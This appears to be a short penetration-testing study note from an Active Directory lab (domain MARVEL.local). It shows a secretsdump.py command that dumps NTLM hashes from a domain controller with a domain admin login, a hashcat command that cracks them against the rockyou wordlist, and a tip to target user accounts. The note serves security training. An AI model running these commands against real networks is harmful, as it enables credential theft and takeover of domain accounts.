![[Pasted image 20240323122153.png]]

# Exploitation

Using *secretsdump.py* we can dump the *NTDS.dit* database with our DA account:
```bash
secretsdump.py MARVEL.local/hawkeye:'Password1@'@10.0.0.18 -just-dc-ntlm
```
Args:
`-just-dc-ntlm`: Extract only NTDS.DIT data (NTLM hashes only)

Output:
![[Pasted image 20240323122812.png]]

Crack the hashes with *hashcat*:
```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

>[!Note]
>Don't try to crack computer passwords, just crack user password!
